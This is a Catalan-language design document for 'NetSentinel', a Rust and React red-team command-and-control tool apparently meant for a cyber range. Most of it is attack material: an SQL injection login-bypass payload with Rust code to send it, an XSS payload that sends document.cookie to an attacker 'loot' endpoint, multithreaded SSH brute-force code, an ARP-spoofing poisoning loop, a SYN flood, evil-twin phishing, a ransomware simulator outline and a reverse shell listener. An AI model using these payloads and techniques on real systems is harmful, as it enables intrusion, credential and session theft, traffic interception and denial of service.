# 🏴‍☠️ NETSENTINEL: MANUAL D'OPERACIONS OFENSIVES (RED TEAM EDITION)

**CLASSIFICACIÓ:** TOP SECRET / EYES ONLY
**AUTOR:** 0xRed (Lead Architect & Red Teamer)
**CONTEXT:** Cyber Range / Laboratori Educatiu
**ESTAT:** IMPLEMENTACIÓ ACTIVA (Rust Backend)

---

## ⚠️ MISSIÓ I FILOSOFIA
Aquest document defineix l'especificació tècnica dels **vectors d'atac** integrats en el nucli de NetSentinel.
NetSentinel no és només un monitor; és una plataforma **C2 (Command & Control)**.
* **Cerveell:** Rust (Rendiment, Concurrència, Raw Sockets).
* **UI/C2:** Tauri + React (Panell de control de l'operador).
* **Visió:** Three.js (Visualització de l'impacte en temps real).

---

## 1. VECTORS WEB (WEB WARFARE)
**Ubicació:** `src-tauri/src/modules/web_exploits.rs`
**Crates clau:** `reqwest`, `scraper`, `tokio`

### 1.1 SQL Injection (Automated Bypass)
**Objectiu:** Exfiltració de dades i bypass d'autenticació en panells d'administració.
**Mecànica:** L'escàner detecta inputs HTTP i injecta payloads per trencar la lògica SQL.

* **Implementació Rust (Snippet Conceptual):**
```rust
pub async fn execute_sqli(target_url: &str) -> Result<String, Error> {
    // Payload clàssic per saltar-se logins
    let payload = "admin' OR '1'='1' --"; 
    let params = [("username", payload), ("password", "dummy")];

    let client = reqwest::Client::new();
    let res = client.post(target_url)
        .form(&params)
        .send()
        .await?;

    // Si rebem un 200 OK i keywords d'admin, tenim èxit
    if res.text().await?.contains("Dashboard") {
        return Ok("VULNERABLE: Admin Access Bypassed".to_string());
    }
    Err("Secure".into())
}
```
* **Visualització 3D:** El node servidor es torna **Taronja** i es dibuixa una línia de flux de dades cap al node de l'atacant.

### 1.2 Cross-Site Scripting (XSS) - Cookie Heist
**Objectiu:** Robatori de sessions d'administrador.
**Mecànica:** Injecció de JavaScript maliciós que envia les cookies al servidor intern de NetSentinel.

* **Payload Generat:**
```javascript
<script>fetch('http://[NETSENTINEL_IP]:8888/loot?c='+document.cookie)</script>
```
* **Integració:** Rust aixeca un petit servidor HTTP (via `warp`) per rebre el paràmetre `?c=` i guardar-lo a la base de dades de "Loot".

---

## 2. FORÇA BRUTA (CREDENTIAL ACCESS)
**Ubicació:** `src-tauri/src/modules/bruteforce.rs`
**Crates clau:** `ssh2`, `rayon` (paral·lelisme)

### 2.1 Hydra-Style Multi-threading
**Objectiu:** Crackeig massiu de serveis SSH, FTP i RDP.
**Mecànica:** Ús de la potència de Rust per llançar centenars de fils simultanis sense bloquejar la UI.

* **Implementació Rust:**
```rust
use rayon::prelude::*;

pub fn crack_ssh(target: &str, user: &str, wordlist: Vec<String>) {
    // Paral·lelisme real a nivell de CPU
    wordlist.par_iter().for_each(|password| {
        if try_ssh_connection(target, user, password) {
            // ÈXIT: Notificar al Frontend immediatament
            emit_tauri_event("crack_success", Payload { 
                target: target, 
                creds: format!("{}:{}", user, password) 
            });
        }
    });
}
```
* **Visualització 3D:** El node objectiu parpelleja en **Vermell** (efecte *pulse*) amb cada intent. En cas d'èxit, apareix una icona de "Cadena trencada" a sobre.

---

## 3. INTERCEPCIÓ DE XARXA (MITM & DoS)
**Ubicació:** `src-tauri/src/modules/network_ops.rs`
**Crates clau:** `pnet` (Raw Sockets), `arp`

### 3.1 ARP Spoofing (The Silent Killer)
**Objectiu:** Redirecció de tràfic (Man-in-the-Middle).
**Mecànica:** Enverinament de la taula ARP de la víctima i del router.

* **Ordre Operativa (Privilegiada):**
```rust
// Habilitar IP Forwarding perquè la víctima no perdi connexió
std::process::Command::new("sysctl")
    .arg("-w")
    .arg("net.ipv4.ip_forward=1")
    .output()
    .expect("Failed to enable forwarding");

// Bucle d'envenenament (Rust thread)
loop {
    send_arp_packet(victim_ip, my_mac, router_ip); // Enganyar víctima
    send_arp_packet(router_ip, my_mac, victim_ip); // Enganyar router
    thread::sleep(Duration::from_millis(2000));
}
```
* **Visualització 3D:** L'enllaç original Víctima-Router desapareix. Es crea un **Triangle Vermell** connectant Víctima -> NetSentinel -> Router.

### 3.2 TCP SYN Flood (DoS)
**Objectiu:** Denegació de servei per saturació.
**Mecànica:** Enviar paquets SYN massius amb IP d'origen falsificada (Spoofing).

* **Detall Tècnic:** Rust construeix paquets TCP crus utilitzant `pnet::packet::tcp`. Mai s'envia l'ACK final, deixant el servidor amb milers de connexions "half-open".
* **Visualització 3D:** El node objectiu s'infla de mida (escala x2) i emet partícules negres (fum/foc).

---

## 4. ENGINYERIA SOCIAL (PHISHING)
**Ubicació:** `src-tauri/src/modules/fake_server.rs`

### 4.1 Captive Portal Clone (Evil Twin)
**Objectiu:** Clonació de logins Wi-Fi o corporatius.
**Mecànica:**
1.  **Deauth:** Desconnectar l'usuari de la xarxa legítima.
2.  **Clone:** Aixecar un servidor web intern servint un clon de `login.html`.
3.  **Capture:** Guardar credencials a `loot/creds.json`.

---

## 5. POST-EXPLOTACIÓ (C2 & MALWARE)
**Ubicació:** `src-tauri/src/modules/payloads.rs`

### 5.1 Ransomware Simulator (PoC)
**Objectiu:** Demostració d'impacte (xifratge de fitxers).
**Nota de Seguretat:** Només actua sobre carpetes de prova designades (`/tmp/netsentinel_target`).

* **Lògica Rust:**
```rust
use aes::Aes256;
// 1. Generar clau simètrica.
// 2. Recórrer directori recursivament.
// 3. Llegir Bytes -> Xifrar -> Sobreescriure.
// 4. Renombrar a .ns_locked
```

### 5.2 Reverse Shell Listener
**Objectiu:** Control remot total via terminal.
**Integració UI:**
* El backend Rust obre un `TcpListener` al port 4444.
* El frontend React mostra una **Terminal (xterm.js)** dins del dashboard.
* Tot el que escrius a la UI s'envia pel socket TCP cap a la víctima infectada.

---
**FI DEL DOCUMENT**
*Autoritzat per 0xRed per a ús exclusiu en NetSentinel Cyber Range.*